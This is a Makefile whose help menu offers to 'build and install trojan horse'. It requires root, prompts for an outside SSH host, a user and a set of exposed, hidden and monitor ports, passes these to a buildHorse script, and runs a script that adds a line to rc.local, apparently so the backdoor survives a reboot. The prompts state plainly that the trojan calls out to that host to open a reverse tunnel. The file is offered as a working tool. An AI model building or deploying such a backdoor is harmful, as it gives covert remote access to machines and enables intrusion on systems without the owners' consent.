.PHONY: all help build run builddocker rundocker kill rm-image rm clean enter logs

user = $(shell whoami)
ifeq ($(user),root)
else
$(error  "run as root!)
endif

all: help

help:
	@echo ""
	@echo "-- Help Menu"
	@echo ""  This is merely a base image for usage read the README file
	@echo ""   1. make trojan       - build and install trojan horse  

trojan: NAME TAG SSH_PORT_EXPOSED SSH_PORT_HIDDEN SSH_PORT_MONITOR SSH_HOST SSH_USER trojanHorse addline

trojanHorse:
	$(eval SSH_PORT_EXPOSED := $(shell cat SSH_PORT_EXPOSED))
	$(eval SSH_PORT_HIDDEN := $(shell cat SSH_PORT_HIDDEN))
	$(eval SSH_PORT_MONITOR := $(shell cat SSH_PORT_MONITOR))
	$(eval SSH_HOST := $(shell cat SSH_HOST))
	$(eval SSH_USER := $(shell cat SSH_USER))
	./buildHorse $(SSH_PORT_EXPOSED) $(SSH_PORT_HIDDEN) $(SSH_PORT_MONITOR) $(SSH_HOST) $(SSH_USER)

addline:
	./add_line_to_rc_local

NAME:
	@while [ -z "$$NAME" ]; do \
		read -r -p "Enter the name you wish to associate with this container [NAME]: " NAME; echo "$$NAME">>NAME; cat NAME; \
	done ;

TAG:
	@while [ -z "$$TAG" ]; do \
		read -r -p "Enter the tag you wish to associate with this container [TAG]: " TAG; echo "$$TAG">>TAG; cat TAG; \
	done ;

SSH_PORT_EXPOSED:
	@while [ -z "$$SSH_PORT_EXPOSED" ]; do \
		read -r -p "This is the port on the ssh host that is exposed. Enter the SSH_PORT_EXPOSED you wish to associate with this container [SSH_PORT_EXPOSED]: " SSH_PORT_EXPOSED; echo "$$SSH_PORT_EXPOSED">>SSH_PORT_EXPOSED; cat SSH_PORT_EXPOSED; \
	done ;

SSH_PORT_HIDDEN:
	@while [ -z "$$SSH_PORT_HIDDEN" ]; do \
		read -r -p "This is the hidden port on the ssh host you will connect to reverse tunnel back to our trojan. Enter the SSH_PORT_HIDDEN you wish to associate with this container [SSH_PORT_HIDDEN]: " SSH_PORT_HIDDEN; echo "$$SSH_PORT_HIDDEN">>SSH_PORT_HIDDEN; cat SSH_PORT_HIDDEN; \
	done ;

SSH_PORT_MONITOR:
	@while [ -z "$$SSH_PORT_MONITOR" ]; do \
		read -r -p "This is the monitor port. Enter the SSH_PORT_MONITOR you wish to associate with this container [SSH_PORT_MONITOR]: " SSH_PORT_MONITOR; echo "$$SSH_PORT_MONITOR">>SSH_PORT_MONITOR; cat SSH_PORT_MONITOR; \
	done ;

SSH_HOST:
	@while [ -z "$$SSH_HOST" ]; do \
		read -r -p "This is the host the trojan will call out to and make the reverse tunnel at. Enter the SSH_HOST you wish to associate with this container [SSH_HOST]: " SSH_HOST; echo "$$SSH_HOST">>SSH_HOST; cat SSH_HOST; \
	done ;

SSH_USER:
	@while [ -z "$$SSH_USER" ]; do \
		read -r -p "This is the user on the host the trojan will call out to and make the reverse tunnel at. Enter the SSH_USER you wish to associate with this container [SSH_USER]: " SSH_USER; echo "$$SSH_USER">>SSH_USER; cat SSH_USER; \
	done ;
